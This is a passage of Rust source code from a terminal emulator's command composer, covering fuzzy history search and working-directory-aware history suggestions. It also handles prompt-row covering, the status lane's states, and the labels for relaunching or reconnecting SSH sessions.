            self.insert_history(cmd);
        }
    }

    /// Esc / Run-slot click while open: restore the pre-search draft
    /// EXACTLY and keep the editor focused (§12.11 — typing continues in
    /// the composer the moment the overlay closes).
    pub fn search_cancel(&mut self) {
        if let Some(s) = self.search.take() {
            self.draft = s.saved;
            self.caret_to_end = true;
            self.want_focus = true;
        }
    }

    /// The editor left Compose (demote / blur / exit / reset): the overlay
    /// dies with it, restoring the stash silently — search state can never
    /// leak into the next arm, and no focus is stolen on the way out.
    fn search_close_quiet(&mut self) {
        if let Some(s) = self.search.take() {
            self.draft = s.saved;
        }
    }
}

/// Overlay row cap (Tier-2b #1): enough to scan at a glance, small enough
/// to stay a strip garnish rather than a modal (seamless doctrine).
pub(crate) const SEARCH_MAX: usize = 8;

/// One ranked history-search result.
pub(crate) struct SearchHit {
    /// Pristine command — what accept inserts (interior newlines intact).
    pub cmd: String,
    /// Single-line display form the match ran against (newlines → spaces),
    /// so the highlight indices below always line up with what's painted.
    pub disp: String,
    /// Matched CHAR indices into `disp` (the overlay's highlight spans).
    pub hl: Vec<usize>,
}

/// Rank the command history against the query: the same `recs` source the
/// recall walk uses, deduped, blanks skipped, most-recent-first — then
/// scored by the fuzzy matcher (exact > prefix > substring > subsequence;
/// see fuzzy.rs). The sort is stable, so equal scores keep recency order,
/// and an empty query is simply the most-recent-first list. Pure derivation
/// — recomputed per frame while the overlay is open, never stored.
pub(crate) fn search_results(recs: &[BlockRec], query: &str, cap: usize) -> Vec<SearchHit> {
    let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
    let mut scored: Vec<(i32, SearchHit)> = Vec::new();
    for r in recs.iter().rev() {
        if r.cmd.trim().is_empty() || !seen.insert(r.cmd.as_str()) {
            continue;
        }
        let disp = r.cmd.replace(['\r', '\n'], " ");
        if let Some((score, hl)) = super::fuzzy::fuzzy_match(query, &disp) {
            scored.push((
                score,
                SearchHit {
                    cmd: r.cmd.clone(),
                    disp,
                    hl,
                },
            ));
        }
    }
    scored.sort_by_key(|s| std::cmp::Reverse(s.0));
    scored.truncate(cap);
    scored.into_iter().map(|(_, h)| h).collect()
}

/// Predictive history ghost (Tier-2a #2, PSReadLine-prediction parity — the
/// composer covers the shell's own inline suggestion; this restores the
/// feel): the remainder of the MOST-RECENT command the draft is a strict,
/// case-sensitive prefix of. Pure derivation from `recs` + the live draft —
/// never stored, so typing past / editing / mismatch clears it naturally.
/// Single-line only on both sides: the ghost paints inline in the lane, and
/// a multiline suggestion could not (nor could a multiline draft anchor
/// one). Blank commands are skipped (recall parity); an exact match yields
/// no remainder and falls through to an older, longer command.
///
/// CWD-AWARE (v0.1.10 sandbox fix): an entry whose recorded cwd
/// (`BlockRec.cwd` — the directory the command STARTED in) differs from the
/// terminal's current tracked cwd is skipped when its command is
/// path-sensitive (`path_sensitive`). The field failure: in `C:\Users` the
/// composer ghosted `cd Users\…` recorded from a session rooted at `C:\`;
/// accepted + submitted, PowerShell errored on `C:\Users\Users`. Unknown
/// cwd on EITHER side counts as different (conservative — never suggest a
/// relative path we can't certify), and ineligible entries fall through to
/// older eligible ones. Location-independent commands (`git status`,
/// `cargo build`) stay eligible across cwds — the useful case. `cur_cwd`
/// must be the SAME tracked-cwd string the Tab completer receives
/// (`prompt_cwd` in show()), so the two features can never disagree about
/// where we are.
fn history_ghost(
    recs: &[BlockRec],
    draft: &str,
    fam: &complete::Family,
    cur_cwd: Option<&str>,
) -> Option<String> {
    if draft.is_empty() || draft.contains('\n') {
        return None;
    }
    recs.iter().rev().find_map(|r| {
        let rest = r.cmd.strip_prefix(draft)?;
        if rest.is_empty() || rest.contains('\n') || r.cmd.trim().is_empty() {
            return None;
        }
        (!path_sensitive(fam, &r.cmd) || same_cwd(r.cwd.as_deref(), cur_cwd))
            .then(|| rest.to_string())
    })
}

/// The command's meaning depends on the directory it runs in: its head is a
/// directory-changing verb WITH an argument (`cd x`, `pushd ..`,
/// `Set-Location y` — pwsh verbs fold case), or any non-flag token names a
/// RELATIVE filesystem location (`relative_path_token`). Rides the same
/// classifier the prompt highlighting uses (`highlight::classify`, i.e. the
/// Tab completer's tokenizer underneath), so quoting and command separators
/// behave identically everywhere: `git log && cd sub` is caught, a bare
/// `cd` (no argument) and flag tokens are not.
fn path_sensitive(fam: &complete::Family, cmd: &str) -> bool {
    use super::highlight::Class;
    let mut cd_head = false;
    for (r, class) in super::highlight::classify(fam, cmd) {
        let raw = cmd[r].trim_matches(|c| c == '\'' || c == '"');
        match class {
            Class::Head => {
                cd_head = ["cd", "chdir", "pushd", "set-location", "sl"]
                    .iter()
                    .any(|v| raw.eq_ignore_ascii_case(v));
                // A relative-path head (`.\build.ps1`, `bin\tool`) is
                // location-dependent all by itself.
                if relative_path_token(fam, raw) {
                    return true;
                }
            }
            Class::Op | Class::Flag => {}
            _ => {
                if cd_head {
                    return true; // cd-like verb with any argument
                }
                if relative_path_token(fam, raw) {
                    return true;
                }
            }
        }
    }
    false
}

/// The token names a filesystem location RELATIVE to the cwd: it contains a
/// path separator but is not anchored — drive-rooted (`C:\…` / `C:/…`), UNC
/// (`\\srv\…` / `//srv/…`), home (`~/…` / `~\…`), a URL (`scheme://…`), or
/// posix-absolute (`/…`) on the posix-fs families (WSL/ssh). Drive-relative
/// (`C:foo\bar`) and `.\x`, `..\x`, `a\b`, `sub/dir` all count as relative.
fn relative_path_token(fam: &complete::Family, raw: &str) -> bool {
    if !raw.contains('\\') && !raw.contains('/') {
        return false;
    }
    let b = raw.as_bytes();
    if b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && (b[2] == b'\\' || b[2] == b'/')
    {
        return false; // drive-rooted
    }
    if raw.starts_with("\\\\") || raw.starts_with("//") {
        return false; // UNC
    }
    if raw.starts_with("~/") || raw.starts_with("~\\") {
        return false; // home-anchored: cwd-independent
    }
    if raw.contains("://") {
        return false; // URL, not a path (git clone https://…)
    }
    if raw.starts_with('/')
        && matches!(fam, complete::Family::Wsl { .. } | complete::Family::Ssh)
    {
        return false; // posix-absolute on a posix fs
    }
    true
}

/// Both sides known and naming the same directory (trailing separators
/// trimmed, ASCII case folded — Windows paths dominate and hook feeds vary
/// drive-letter case). Either side unknown ⇒ NOT the same (conservative).
fn same_cwd(rec: Option<&std::path::Path>, cur: Option<&str>) -> bool {
    let (Some(rec), Some(cur)) = (rec, cur) else {
        return false;
    };
    let norm = |s: &str| s.trim_end_matches(['\\', '/']).to_ascii_lowercase();
    norm(&rec.to_string_lossy()) == norm(cur)
}

/// The grid row the CURRENT-PROMPT cover should BLANK this frame, if any
/// (static-input architecture: the shell's latched prompt row renders as
/// whitespace — the composer's strip editor is the one prompt; the grid
/// cursor stays hidden under the blank). Single source of truth for the
/// paint gate. A live SubmitHold pins the blank to its recorded row through
/// the submit handoff REGARDLESS of mode and cursor — the hold exists
/// precisely while the grid underneath is behind the user's intent.
/// Otherwise the armed chain: Compose + live prompt latch + cursor exactly
/// at the captured prompt end — any certainty failure ⇒ no blank, raw
/// rendering (never blank on uncertainty). term_view adds visibility checks
/// only; the blank rides display_offset like every presentational cover.
pub fn cover_line_for(
    state: &ComposerState,
    backend: &TermBackend,
    comp_active: bool,
    now: Instant,
) -> Option<i32> {
    state
        .hold_line(backend, now)
        .or_else(|| {
            (comp_active && state.at_prompt_latched() && backend.cursor_at_prompt_end())
                .then(|| {
                    backend
                        .block_feed
                        .as_ref()
                        .and_then(|f| f.prompt_end)
                        .map(|(line, _)| line)
                })
                .flatten()
        })
        .or_else(|| {
            // Optimistic SETTLE-WINDOW cover (flicker fix): a provisional
            // 133;B (ConPTY OSC-vs-text reorder — captured at col 0 with the
            // upgrade pending) leaves the fresh prompt rendering on the grid
            // while the permanent editor already shows in the strip. Blank
            // the prompt ROW now — decoupled from the column settlement —
            // so the raw prompt never flashes beside the editor. The row is
            // stable across the column upgrade (the cursor stays on it as the
            // prompt text renders), and the SubmitHold pin stays settlement-
            // gated (pump_pending readiness), so this presentation-only blank
            // can never mispin a cover. Cursor must still be ON the captured
            // row (a late output tail moved it off ⇒ raw is honest there).
            (comp_active
                && state.mode == ComposerMode::Compose
                && state.at_prompt_latched()
                && backend.prompt_end_pending())
            .then(|| {
                backend
                    .block_feed
                    .as_ref()
                    .and_then(|f| f.prompt_end)
                    .filter(|(line, _)| backend.cursor_line() == *line)
                    .map(|(line, _)| line)
            })
            .flatten()
        })
        .or_else(|| {
            // D2: the heuristic latch's cell — the armed cover paints over
            // the raw `root@…#` row exactly like an integrated prompt row.
            // heur_cover_line embeds the full certainty chain (latch live,
            // cursor anchored, un-resized); any failure ⇒ no blank, raw
            // rendering (drop-don't-drift).
            (comp_active)
                .then(|| state.heur_cover_line(backend))
                .flatten()
        })
        .or_else(|| {
            // Optimistic HEURISTIC cover (flicker fix): with the permanent
            // editor, the strip already shows the `#` editor during the
            // markerless nested-shell re-prompt, but the heuristic LATCH
            // (which gates SUBMISSION) only mints after HEUR_QUIET=300ms —
            // so the raw `root@…#` prompt flashed beside the editor for that
            // whole window. The COVER is decoupled from the arm and paints
            // the SAME frame the classifier first reads the cursor row as a
            // prompt (frame N — the earlier confirm-then-cover left a visible
            // one-frame dual-prompt on every re-mint), then revokes next tick
            // if the row was streaming (`maintain_heur_cover`). Presentation
            // only: a false cover blanks a streaming row for at most one
            // frame; a false ARM would type into a running command, which is
            // why the arm keeps the full 300ms.
            (comp_active)
                .then(|| state.heur_cover_optimistic(backend))
                .flatten()
        })
        .or_else(|| {
            // Prompt-RENDER-window blank (Bug 2, the 1-frame `PS C:\>` flash
            // at submit): between the scanned `pre` and its 133;B the fresh
            // prompt text paints raw — at the bottom of the screen that reads
            // as flicker on every submit. We provably know a prompt is
            // rendering and on WHICH row (`incoming_prompt_row`: pre scanned,
            // no exec since, no prompt_end yet, live cursor still on the
            // captured row) — blank it; the armed cover takes over on the
            // same row the frame 133;B lands. Compose-scoped: a raw-mode
            // user's prompt must render normally. Freshness-capped so a lost
            // 133;B resurfaces the raw prompt fast. Any certainty failure ⇒
            // no blank (drop-don't-drift).
            (comp_active
                && state.mode == ComposerMode::Compose
                && state
                    .at_prompt_since
                    .is_some_and(|t| now.duration_since(t) < INCOMING_COVER_CAP))
            .then(|| backend.incoming_prompt_row())
            .flatten()
        })
}

/// The LEFT lane's content class this frame — the stable-chrome state table
/// (F3), pure so the strip-stability walk is pinned by test. The right
/// cluster never depends on this: it is pixel-static across every row of
/// the table. `open_rec` = an open record exists in the mirrored recs.
#[derive(PartialEq, Debug, Clone, Copy)]
pub(crate) enum LaneContent {
    /// Compose: `❯ cwd` + the editor with the one caret.
    Editor,
    SessionEnded,
    /// SSH auto-reconnect: spinner + "reconnecting…" left, accent `Cancel`
    /// in the Run slot. Wins over SessionEnded while the flag is set (the
    /// daemon is actively retrying — Dead is a transient here).
    Reconnecting,
    /// SLEEP §7.3: `☾ asleep` left, accent `Wake ▸` in the Run slot.
    Asleep,
    AltScreen,
    /// SubmitHold live: the submitted text, frozen (no caret) — at Enter the
    /// only pixel change is the caret disappearing.
    Frozen,
    /// A transient younger than REVEAL (post-submit window, pre→133;B render
    /// gap, hold release, un-revealed busy): render NOTHING new.
    Quiet,
    /// Open block ≥ REVEAL old: pulsing dot + cmd + elapsed.
    Busy,
    /// Steady raw: keyboard glyph + label (+ ❯ Compose when armable).
    Label,
}

pub(crate) fn lane_content(
    state: &ComposerState,
    running: bool,
    alt: bool,
    open_rec: bool,
    now: Instant,
) -> LaneContent {
    let reason = match state.mode {
        ComposerMode::Compose => return LaneContent::Editor,
        ComposerMode::Raw(r) => r,
    };
    // SLEEP: shelved wins over dead — the flag check covers the one-frame
    // window where the mode still says Dead but the Snapshot already
    // flagged the terminal (tick re-derives Raw(Asleep) next frame).
    if reason == RawReason::Asleep || (state.asleep && !running) {
        return LaneContent::Asleep;
    }
    // Reconnecting wins over SessionEnded: while the supervision flag is up
    // the Dead states between attempts are transients — the lane must not
    // flicker Dead/attempt/Dead across the backoff. (Never over Asleep:
    // sleep cancels supervision daemon-side.)
    if state.reconnecting {
        return LaneContent::Reconnecting;
    }
    if !running || reason == RawReason::Dead {
        return LaneContent::SessionEnded;
    }
    if alt {
        return LaneContent::AltScreen;
    }
    if state.submit_hold.is_some() {
        return LaneContent::Frozen;
    }
    // F7 companion: a scanned pre closes the block locally — the busy row
    // must not linger for the Blocks round-trip.
    if open_rec && !state.at_prompt_latched() {
        let revealed = state
            .busy_since
            .is_some_and(|t| now.duration_since(t) >= REVEAL);
        return if revealed {
            LaneContent::Busy
        } else {
            LaneContent::Quiet
        };
    }
    if state
        .last_activity
        .is_some_and(|t| now.duration_since(t) < REVEAL)
    {
        return LaneContent::Quiet;
    }
    LaneContent::Label
}

/// Bug C/C2 — the strip-collapse predicate (pure, table-tested like
/// `lane_content`), and the SINGLE SOURCE for both paint and geometry: the
/// strip collapses — stops painting AND hands its 36px reservation to the
/// grid (`layout_for` + central's card split both call exactly this fn, so
/// paint and PTY size can never disagree) — iff the lane presents the
/// alt-screen state (lane_content's precedence already keeps Asleep
/// `Wake ▸`, Reconnecting `Cancel`, SessionEnded `Restore ▸` and every
/// non-alt lane visible) and the alt screen has been held continuously for
/// ≥ HIDE_AFTER (the hysteresis doubles as the resize debounce — alt
/// flapping can't storm PTY resizes). Hover is deliberately NOT an input:
/// the hover-peek is a translucent OVERLAY painted over the grid's bottom
/// band (peek = look, not reflow — a hover must never resize the TUI).
/// Key-based reveal stays rejected: keys belong to the app under alt by
/// definition. The alt falling edge un-collapses the SAME tick regardless
/// of the clock: the lane is no longer AltScreen, the strip returns and the
/// grid gives the rows back.
pub(crate) fn strip_hidden(
    state: &ComposerState,
    running: bool,
    alt: bool,
    open_rec: bool,
    now: Instant,
) -> bool {
    lane_content(state, running, alt, open_rec, now) == LaneContent::AltScreen
        && state
            .alt_since
            .is_some_and(|t| now.duration_since(t) >= HIDE_AFTER)
}

/// Dead-relaunch fix a — the strip-presence gate (pure, table-tested): a
/// terminal gets the composer strip when it is HOOKED (P3's original gate),
/// when it is DEAD (a never-hooked dead ssh tab must still get the
/// SessionEnded `↻ Restore ⏎` affordance — previously it rendered NO strip
/// at all and the only relaunch control was the dashboard hover-reveal), or
/// while RECONNECT SUPERVISION is up (a hookless tab's manual Retry must
/// keep its `reconnecting… / Cancel` lane through the Running-attempt
/// phases, or Cancel becomes unreachable mid-supervision). A LIVE hookless
/// terminal stays strip-free — the gate can only flip on real lifecycle
/// edges (death/relaunch/supervision), never per-frame, so live hookless
/// tabs cannot storm geometry.
pub(crate) fn strip_eligible(hooked: bool, dead: bool, reconnecting: bool) -> bool {
    hooked || dead || reconnecting
}

/// Dead-relaunch fix a — Enter ownership on a dead terminal (pure): Enter
/// relaunches ONLY when the lane presents SessionEnded (`dead_lane` already
/// excludes asleep and reconnecting — those own their Enter/click exactly as
/// before), the terminal card owns the keyboard, the draft is EMPTY (a
/// non-empty draft's Enter is NOT consumed — it keeps its ordinary path),
/// and no overlay is open (a popup's Enter must never relaunch).
pub(crate) fn dead_enter_restores(
    dead_lane: bool,
    term_focused: bool,
    has_draft: bool,
    overlay_open: bool,
) -> bool {
    dead_lane && term_focused && !has_draft && !overlay_open
}

/// Dead-relaunch fix a — the SessionEnded lane text: name the gesture AND
/// what it re-runs. Program terminals get the command (`Press Enter to
/// relaunch — ssh 192.168.50.239`); plain shells the bare gesture.
pub(crate) fn relaunch_label(cmd: Option<&str>) -> String {
    match cmd {
        Some(c) => format!("Press Enter to relaunch \u{2014} {c}"),
        None => "Press Enter to relaunch".to_string(),
    }
}

/// F1 (ssh-reestablish) — the Reconnecting lane's text (pure, golden-
/// tested): the AUTO supervision keeps its plain "reconnecting…"; the
/// MANUAL, unlimited ladder shows its attempts honestly — `retrying —
/// attempt 7 · next in 30s` between rungs, `retrying — attempt 7…` while an
/// attempt is in flight, and the first rung names itself before anything
/// has fired. Cancel stays in the Run slot through every phase.
pub(crate) fn retry_lane_label(attempt: u32, next_s: u32) -> String {
    match (attempt, next_s) {
        (0, 0) => "reconnecting\u{2026}".to_string(),
        (0, s) => format!("retrying \u{2014} first attempt in {s}s"),
        (n, 0) => format!("retrying \u{2014} attempt {n}\u{2026}"),
        (n, s) => format!("retrying \u{2014} attempt {n} \u{b7} next in {s}s"),
    }
}

/// What a Restore re-runs, humanized, from the persisted spawn identity —
/// the source for `ComposerState::relaunch_cmd` (pure so the label contract
/// is unit-tested). Ssh-family terminals name the destination (`ssh <host>`
/// — program stem + the host arg, per the field brief); Custom commands name
/// their program stem (an `ssh.exe host` built as Custom still resolves the
/// host); plain shells (and Claude-kind — its resume identity is not a
/// command line) get None → the bare "Press Enter to relaunch".
pub(crate) fn relaunch_desc(
    kind: &crate::state::TermKind,
    program: &str,
    args: &[String],
) -> Option<String> {
    use crate::state::{shell_family, ssh_destination, ShellFamily, TermKind};
    if let ShellFamily::Ssh { host } = shell_family(kind, program, args) {
        return Some(format!("ssh {host}"));
    }
    if !matches!(kind, TermKind::Custom) {
        return None;
    }
    let stem = std::path::Path::new(program)
        .file_stem()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .filter(|s| !s.is_empty())?;
    match (stem.as_str(), ssh_destination(args)) {
        ("ssh", Some(host)) => Some(format!("ssh {host}")),
        _ => Some(stem),
    }
}

/// What `show` hands back to the app.
pub struct ComposerOutput {
    /// Bytes to ship to the daemon as terminal input (submission / refresh /
    /// clear chord) — the ONLY bytes composer code may emit (§14).
    pub write: Vec<u8>,
    /// The editor holds egui focus this frame (steers the grid's focus flag).
    pub has_focus: bool,
    /// This frame's submit was the empty-Enter spacing gesture: the app marks
    /// the current prompt row a blank spacer cover (§ "more lines").
    pub spacer_gesture: bool,
    /// The strip's History button was clicked (P4): the app toggles the
    /// cross-session history popup.
    pub toggle_history: bool,
    /// Screen rect of the History button this frame, when drawn — the
    /// popup's click-outside close must exempt it (blocks-panel pattern).
    pub history_btn: Option<Rect>,
    /// SLEEP §7.3: the lane's `Wake ▸` was clicked — the app sends
    /// RestartTerminal (launch() clears the asleep flag).
    pub wake: bool,
    /// The dead lane's `Restore ▸` was clicked — the app sends
    /// RestartTerminal (the unmissable dead-ssh affordance; the top bar shed
    /// its Restore in task #22, leaving only the row's hover ↻).
    pub restore: bool,
    /// The reconnecting lane's `Cancel` was clicked — the app sends
    /// C2D::CancelReconnect (supervision stops; Dead + Restore affordances
    /// take over).
    pub cancel_reconnect: bool,
    /// The dead lane's `Retry ▸` was clicked (ssh only, dead-relaunch fix
    /// b) — the app sends C2D::RetryReconnect (proto-gated): the daemon
    /// enters the existing bounded reconnect supervision by explicit user
    /// consent, no hooks_were_live gate.
    pub retry_reconnect: bool,
    /// C2: the collapsed strip's hover-peek overlay is showing this frame
    /// (render-only — an alpha-faded translucent band floating over the
    /// grid's bottom rows; no geometry, no interaction). Surfaced so tests
    /// pin peek-never-reflows.
    pub strip_peek: bool,
}

/// What the manual-activation click will do to typed prompt text — computed
/// per frame ONLY in the ManualOnly-dirty strip state (one bounded grid read
/// of ≤ RECLAIM_ROW_CAP×cols cells; µs against the ~240µs p50 frame). No
/// caching: a cache keyed on cursor position would go stale on Delete-key
/// edits, and a wrong label is worse than microseconds.
#[derive(Clone, Copy, PartialEq, Debug)]
enum ActPreview {
    Keeps,
    Clears,
}

fn activation_preview(backend: &TermBackend) -> ActPreview {
    match backend.reclaim_text() {
        Reclaim::Text(t) if !t.is_empty() => ActPreview::Keeps,
        _ => ActPreview::Clears,
    }
}

fn now_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::SystemTime::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

/// TC_TRACE_COMPOSER=1 → per-episode gate-verdict lines in gui.log (cached
/// once; costs nothing otherwise).
fn trace_enabled() -> bool {
    static ON: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *ON.get_or_init(|| std::env::var("TC_TRACE_COMPOSER").as_deref() == Ok("1"))
}

/// Caret line of the composer TextEdit: (line index, total lines). Defaults
/// to the first line when the edit state doesn't exist yet.
fn caret_line(ctx: &egui::Context, id: Id, text: &str) -> (usize, usize) {
    let total = text.split('\n').count().max(1);
    let idx = egui::text_edit::TextEditState::load(ctx, id)
        .and_then(|s| s.cursor.char_range())
        .map(|r| r.primary.index.0)
        .unwrap_or(0);
    let line = text
        .chars()
        .take(idx)
        .filter(|&c| c == '\n')
        .count()
        .min(total - 1);
    (line, total)
}

/// The editor caret as a BYTE offset into the draft (the tokenizer's
/// coordinate space). No edit state yet ⇒ the draft's end.
fn caret_byte_of(ctx: &egui::Context, id: Id, text: &str) -> usize {
    let chars = egui::text_edit::TextEditState::load(ctx, id)
        .and_then(|s| s.cursor.char_range())
        .map(|r| r.primary.index.0)
        .unwrap_or_else(|| text.chars().count());
    text.char_indices()
        .nth(chars)
        .map(|(b, _)| b)
        .unwrap_or(text.len())
}

/// Place the editor caret at a char index BEFORE the TextEdit shows (the
/// caret_to_end pattern, arbitrary position) — after a Tab replaces the
/// token, typing continues at the completed token's end.
fn set_caret_chars(ctx: &egui::Context, id: Id, chars: usize) {
    let mut st = egui::text_edit::TextEditState::load(ctx, id).unwrap_or_default();
    st.cursor
        .set_char_range(Some(egui::text::CCursorRange::one(egui::text::CCursor::new(
            chars,
        ))));
    st.store(ctx, id);
}

/// Tiny painter keyboard glyph (mouse-first: labels get icons, not hotkeys).
/// One Ctrl-R overlay row's layout job: base-colored text with the matched
/// chars lifted to the accent (Tier-2b #1). `hl` = ascending CHAR indices
/// into `disp` (straight from the matcher). No wrap — rows clip.
fn search_row_job(
    disp: &str,
    hl: &[usize],
    base: Color32,
    font: &FontId,
) -> egui::text::LayoutJob {
    use egui::text::{LayoutJob, TextFormat};
    let mut job = LayoutJob::default();
    job.wrap.max_width = f32::INFINITY;
    let base_fmt = TextFormat::simple(font.clone(), base);
    let hit_fmt = TextFormat::simple(font.clone(), super::ACCENT);
    let mut k = 0usize; // pointer into hl
    let mut seg = String::new();
    let mut seg_hl = false;
    for (ci, ch) in disp.chars().enumerate() {
        let is_hl = k < hl.len() && hl[k] == ci;
        if is_hl {
            k += 1;
        }
        if ci == 0 {
            seg_hl = is_hl;
        }
        if is_hl != seg_hl {
            let fmt = if seg_hl { &hit_fmt } else { &base_fmt };
            job.append(&seg, 0.0, fmt.clone());
            seg.clear();
            seg_hl = is_hl;
        }
        seg.push(ch);
    }
    if !seg.is_empty() {
        let fmt = if seg_hl { &hit_fmt } else { &base_fmt };
        job.append(&seg, 0.0, fmt.clone());
    }
    job
}

fn draw_keyboard(painter: &egui::Painter, c: Pos2, color: Color32) {
    let body = Rect::from_center_size(c, Vec2::new(16.0, 11.0));
    painter.rect_stroke(
        body,
        CornerRadius::same(2),
        Stroke::new(1.2, color),
        StrokeKind::Inside,
    );
    for (x, y) in [(-4.0, -2.0), (0.0, -2.0), (4.0, -2.0)] {
        painter.circle_filled(c + Vec2::new(x, y), 0.7, color);
    }
    painter.line_segment(
        [c + Vec2::new(-4.0, 2.5), c + Vec2::new(4.0, 2.5)],
        Stroke::new(1.0, color),
    );
}

/// Tiny painter padlock (v0.1.1 pre-shell password label; S14: painter
/// shapes, never a font glyph): filled body + stroked shackle arc.
fn draw_lock(painter: &egui::Painter, c: Pos2, color: Color32) {
    let body = Rect::from_center_size(c + Vec2::new(0.0, 2.5), Vec2::new(10.0, 8.0));
    painter.rect_filled(body, CornerRadius::same(2), color);
    let r = 3.2;
    let cy = body.min.y;
    let n = 10;
    let mut prev: Option<Pos2> = None;
    for k in 0..=n {
        let a = std::f32::consts::PI * (k as f32 / n as f32);
        let p = Pos2::new(c.x - r * a.cos(), cy - r * a.sin());
        if let Some(q) = prev {
            painter.line_segment([q, p], Stroke::new(1.4, color));
        }
        prev = Some(p);
    }
}

/// Paint the composer's prompt prefix — accent `❯` + dimmed live cwd — on a
/// covered grid row, returning the x where the command text begins. Shared
/// by the live editor and the SubmitHold ghost so the two are pixel-identical
/// (Bug 3: the swap at release must move zero pixels). Also reused by
/// term_view for permanent history covers so a submitted row's `❯ cmd`
/// styling matches the armed/hold look exactly (no swap on hold→history).
pub(crate) fn paint_prompt_prefix(
    painter: &egui::Painter,
    row: Rect,
    cwd: Option<&str>,
    font: &FontId,
) -> f32 {
    paint_prompt_prefix_sigil(painter, row, cwd, font, "\u{276f}")
}

/// `paint_prompt_prefix` with a caller-chosen sigil glyph (D2: the heuristic
/// episode's honesty garnish — the lane chip shows `#` + the best-effort
/// prompt-text cwd instead of claiming a hook-certified `❯ cwd`).
pub(crate) fn paint_prompt_prefix_sigil(
    painter: &egui::Painter,
    row: Rect,
    cwd: Option<&str>,
    font: &FontId,
    sigil: &str,
) -> f32 {
    let mut x = row.min.x;
    let glyph = painter.layout_no_wrap(sigil.into(), font.clone(), super::ACCENT);
    let gy = row.center().y - glyph.size().y / 2.0;
    let gw = glyph.size().x;
    painter.galley(Pos2::new(x, gy), glyph, super::ACCENT);
    x += gw + 8.0;
    if let Some(cwd) = cwd {
        let g = painter.layout_no_wrap(
            super::middle_ellipsize(cwd, 32),
            font.clone(),
            super::TEXT_SECONDARY,
        );
        let w = g.size().x;
        painter.galley(
            Pos2::new(x, row.center().y - g.size().y / 2.0),
            g,
            super::TEXT_SECONDARY,
        );
        x += w + 12.0;
    }
    x
}

/// Draw the composer and route its input. Returns bytes to ship and whether
/// the composer holds egui focus this frame.
///
/// STATIC-INPUT ARCHITECTURE (user decision, supersedes the in-grid armed
/// cover): the editor is stationary furniture — it ALWAYS renders here in
/// the strip lane as `❯ {cwd} {draft}` with the one caret. The grid above
/// is content-only: its latched prompt row is BLANKED by the current-prompt
/// cover (`cover_line`, painted by term_view exactly like spacer rows) and
/// submitted commands become `❯ cwd cmd` history covers where their PS rows
/// were. Responses stack above; the input never moves.
///
/// Seamless doctrine: NO fills, NO hairlines, NO bordered boxes. Structure
/// is spacing and subtle background shifts, never lines. The screenshot
/// test: a terminal with magic, not an app wrapping a terminal.
#[allow(clippy::too_many_arguments)]
pub fn show(
    ui: &mut Ui,
    strip_rect: Rect,
    grid_rect: Rect,
    terminal_id: Uuid,
    state: &mut ComposerState,
    backend: &TermBackend,
    recs: &[BlockRec],
    epoch: u32,
    running: bool,
    // C2: the caller's verdict from the SAME `strip_hidden` predicate that
    // sized the grid this frame (central's card split + layout_for) — when
    // true the band belongs to the grid and this fn paints at most the
    // hover-peek overlay. Passed in rather than recomputed so paint and
    // geometry share one evaluation per frame.
    collapsed: bool,
    overlay_open: bool,
    font: FontId,
    cover_line: Option<i32>,
    prompt_cwd: Option<&str>,
) -> ComposerOutput {
    let mut out = ComposerOutput {
        write: Vec::new(),
        has_focus: false,
        spacer_gesture: false,
        toggle_history: false,
        history_btn: None,
        wake: false,
        restore: false,
        cancel_reconnect: false,
        retry_reconnect: false,
        strip_peek: false,
    };
    let now = Instant::now();
    let inputs = state.gate_inputs(backend, recs, running, now);
    // D2: this terminal is inside a marker-silent nested-shell episode
    // (heuristic composer), and whether the latch is live RIGHT NOW. The
    // episode flag outlives per-cycle latch drops (echo output tears the
    // latch down; the episode spans the whole nested visit).
    let heur_episode = state.heur_episode;
    let heur_armed = heur_episode && state.heur_live(backend);
    // SLEEP §7.3: the lane presents asleep this frame — swaps the Run slot
    // to the accent `Wake ▸` (same fixed slot, stable chrome F3). The flag
    // check covers the one-frame Snapshot-before-tick window.
    let asleep_lane = matches!(state.mode, ComposerMode::Raw(RawReason::Asleep))
        || (state.asleep && !running);
    // SSH auto-reconnect: `reconnecting…` lane + Cancel in the Run slot
    // (never over asleep — sleep cancels supervision daemon-side).
    let recon_lane =
        state.reconnecting && !asleep_lane && matches!(state.mode, ComposerMode::Raw(_));
    // Dead lane: the unmissable Restore ▸ in the Run slot (Bug 4 — the top
    // bar shed lifecycle icons in task #22 and "Session ended" alone was
    // nearly invisible on a dead ssh tab).
    let dead_lane = !running
        && !asleep_lane
        && !recon_lane
        && matches!(state.mode, ComposerMode::Raw(_));
    let painter = ui.painter().clone();

    // ── Bug C/C2: under a STABLE full-screen app the strip is COLLAPSED —
    // the caller handed the band to the grid (`collapsed` came from the same
    // `strip_hidden` predicate that sized the grid and the PTY this frame,
    // so paint can never disagree with geometry) and this fn paints at most
    // the hover-PEEK: a translucent overlay floating over the grid's bottom
    // rows with the normal lane label + cluster, faded in/out (~120ms).
    // Peek is look-only — no geometry (a hover must never SIGWINCH the TUI)
    // and no interaction (the band's pixels belong to the grid: clicks and
    // wheel go to the app). Lane changes un-collapse by construction: the
    // predicate IS the lane, and asleep/reconnecting/dead win over alt in
    // lane_content, so `Wake ▸`, `Cancel` and `Restore ▸` always paint at
    // full strength on a real reserved band.
    let open_rec_any = recs.iter().any(|r| r.end_off.is_none());
    let strip_hover = ui
        .ctx()
        .pointer_latest_pos()
        .is_some_and(|p| strip_rect.contains(p));
    let lane_is_alt =
        lane_content(state, running, inputs.alt, open_rec_any, now) == LaneContent::AltScreen;
    let peek = collapsed && strip_hover;
    out.strip_peek = peek;
    // Band-content alpha: full while the strip is real; the peek animation
    // while collapsed (never a pop). At 0 nothing paints. Non-alt lanes are
    // never collapsed, so they appear at full alpha the same frame (the
    // instant-return contract on TUI exit/death/sleep).
    let reveal = ui.ctx().animate_bool_with_time(
        Id::new(("strip_hide", terminal_id)),
        !collapsed || peek,
        0.12,
    );
    // Repaint discipline: the collapse edge must land without input —
    // schedule the wakeup for the HIDE_AFTER deadline while the alt lane is
    // still visible (that frame the predicate flips, the corrective heal
    // resizes, and the band hands over to the grid). The peek edges ride
    // the pointer-motion repaints.
    if lane_is_alt && !collapsed {
        if let Some(t0) = state.alt_since {
            let d = (t0 + HIDE_AFTER).saturating_duration_since(now);
            if !d.is_zero() {
